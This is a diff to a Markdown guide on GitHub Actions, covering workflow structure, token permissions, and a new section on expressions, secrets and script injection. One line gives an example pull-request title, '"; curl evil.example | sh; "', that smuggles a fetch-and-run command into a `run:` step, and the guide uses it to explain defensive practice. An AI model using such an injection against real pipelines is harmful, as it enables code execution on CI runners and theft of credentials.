@@ -20,13 +20,13 @@ How workflows, jobs, and steps fit together, and what they share. The workflow i
 
 ```mermaid
 flowchart TD
-    R["Repository"] --> W1["Workflow: ci.yml<br/>name: CI<br/>on: pull_request"]
-    R -->  W2["Workflow: publish-image.yml<br/>name: Publish image<br/>on: push to main"]
-    W1 --> J1["Job: build-and-test<br/>own fresh VM"]
-    W1 --> J2["Job: lint<br/>(example)<br/>own fresh VM"]
-    J1 --> S1["Step: check out"]
-    S1 --> S2["Step: start app, wait"]
-    S2 --> S3["Step: logs on failure"]
+    R["Repository"] --> W1["Workflow: ci.yml<br/>on: pull_request, workflow_call"]
+    R --> W2["Workflow: publish-image.yml<br/>on: push to main"]
+    W1 --> J1["Job: build-and-test"]
+    W2 --> J2["Job: build-and-test-main<br/>(calls ci.yml)"]
+    W2 --> J3["Job: push-image-to-ghcr<br/>needs: build-and-test-main"]
+    J1 --> S1["Steps: check out, start, smoke test, ..."]
+    J3 --> S3["Steps: download, load, tag, log in, push"]
 ```
 
 - **Workflow:** one YAML file in `.github/workflows/`. A repository can have many, usually one per purpose or trigger.
@@ -96,6 +96,27 @@ Files a job uploads to GitHub's storage, attached to its workflow run.
 
 ## Security basics
 
-- **`permissions:`** limits the automatic token (`GITHUB_TOKEN`). Default here: read-only.
+- **`permissions:`** limits the automatic token. The workflow-level list is the default; a job-level list **replaces** it for that job.
 - **Actions are third-party code:** pinned by full commit SHA, with the version as a comment.
 - **`timeout-minutes:`** caps a job; the default is 6 hours.
+
+## Expressions and secrets
+
+- **`${{ ... }}`** is evaluated by GitHub **before** a step runs, and its text is pasted into the workflow.
+- **Script injection:** inside `run:`, a pasted value becomes code. A pull request title like `"; curl evil.example | sh; "` would execute.
+- **The rule:** `${{ }}` only in `env:`; scripts reference the environment variable by name.
+
+```yaml
+      - name: Log in to GHCR
+        env:
+          GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: echo "$GHCR_TOKEN" | docker login ghcr.io --username "$GITHUB_ACTOR" --password-stdin
+```
+
+- **`GITHUB_TOKEN`:** created automatically per job, valid for this repository only, with the job's permissions; expires when the job ends.
+- **Repository secrets** (Settings → Secrets) hold long-lived credentials. This project stores none.
+- **Masking:** secret values appear as `***` in logs.
+- **`--password-stdin`:** keeps secrets off the command line, where other processes could read them.
+- **Runner variables** (`GITHUB_SHA`, `GITHUB_REPOSITORY`, `GITHUB_ACTOR`) are ordinary environment variables set by GitHub, not expressions.
+- **`$GITHUB_ENV`:** appending `NAME=value` makes a variable available to later steps of the same job.
+- **`$GITHUB_STEP_SUMMARY`:** text appended here appears on the run's Summary page.
